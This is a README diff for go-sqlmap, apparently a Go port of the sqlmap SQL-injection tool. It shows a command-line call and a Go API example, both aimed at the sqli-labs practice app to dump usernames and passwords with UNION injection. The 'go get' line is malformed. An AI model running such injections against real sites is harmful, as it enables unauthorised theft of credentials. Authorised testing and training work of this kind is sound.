@@ -40,4 +40,33 @@
 github.com/EmYiQing/go-sqlmap.exe -u http://sqlilab-ip/Less-1/?id=1 -D security -T users -C id,username,password --technique U
 ```
 
+## 使用API
+
+```shell
+go get https://github.com/EmYiQing/go-sqlmap
+```
+
+```go
+package main
+
+import (
+	sqlmap "github.com/EmYiQing/go-sqlmap/api"
+	"github.com/EmYiQing/go-sqlmap/start"
+)
+
+func main() {
+	opts := start.Input{
+		Beta:      false,
+		Url:       "http://192.168.222.129:81/Less-1/?id=1",
+		Database:  "security",
+		Table:     "users",
+		Columns:   []string{"id", "username", "password"},
+		Technique: []string{"U"},
+	}
+	instance := sqlmap.NewScanner(opts)
+	instance.Run()
+	instance.Stop()
+}
+```
+
 
